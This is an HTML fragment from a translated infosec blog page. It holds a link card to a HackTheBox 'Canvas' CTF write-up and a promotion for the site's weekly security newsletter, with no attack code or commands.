class="ov l op oq or on os kv oe"/></div></div></a></div><div class="ob oc gp gr od oe"><a rel="noopener  ugc nofollow" target="_blank" href="/hackthebox-canvas-ctf-writeup-75b0f4682ef5"><div class="of ab fo"><div class="og ab oh cl cj oi"><h2 class="bd ir gy z fp oj fr fs ok fu fw ip bi translated">HackTheBox画布CTF特写</h2><div class="ol l"><h3 class="bd b gy z fp oj fr fs ok fu fw dk translated">描述:</h3></div><div class="om l"><p class="bd b dl z fp oj fr fs ok fu fw dk translated">infosecwriteups.com</p></div></div><div class="on l"><div class="ow l op oq or on os kv oe"/></div></div></a></div></div><div class="ab cl ox oy hu oz" role="separator"><span class="pa bw bk pb pc pd"/><span class="pa bw bk pb pc pd"/><span class="pa bw bk pb pc"/></div><div class="ij ik il im in"><h2 id="1514" class="lv ky iq bd kz lw lx dn ld ly lz dp lh jy ma mb ll kc mc md lp kg me mf lt mg bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae oa" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>